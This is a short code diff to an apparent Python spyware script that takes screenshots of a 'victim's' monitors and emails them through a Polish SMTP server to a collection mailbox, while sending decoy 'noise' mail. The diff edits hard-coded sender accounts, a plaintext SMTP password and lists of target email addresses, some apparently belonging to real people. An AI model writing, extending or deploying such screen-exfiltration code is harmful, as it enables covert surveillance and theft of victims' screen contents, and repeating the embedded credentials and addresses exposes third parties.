@@ -22,11 +22,11 @@ time_web_noise = random.randint(10, 60)
 smpt_server = 'smtp.poczta.onet.pl'
 smtp_port = 587
 # this design is simplify for detecting team !
-smtp_acct = 'becyp68@op.pl' # send screenshots
+smtp_acct = "becyp73@op.pl" # send screenshots
 smtp_pass = 'SlavaUkrainie69' # for each same, can be diffrent in (, ) turple, easy for project, team management
 screen_tgt_accts = "becyp69@op.pl" # collect screenshots
-noise_acct_emails = ['becyp70@op.pl', "becyp71@op.pl", "becyp72@op.pl" ] # from those email noise is send
-tgt_noise = ["putin_klug@mail.ru", "iravacik@yandex.com", "tamara.pol222@mail.ru", "cathuvar9090@mail.ru", "wanila0001@yandex.com" ]
+noise_acct_emails = ['becyp68@op.pl','becyp70@op.pl', "becyp71@op.pl", "becyp72@op.pl" ] # from those email noise is send
+tgt_noise = ['becyp68@op.pl', 'becyp70@op.pl', "becyp71@op.pl", "becyp72@op.pl" ]
 now = datetime.now() # current date and time
 
 # getting the size of screen, a victim can have multiple monito
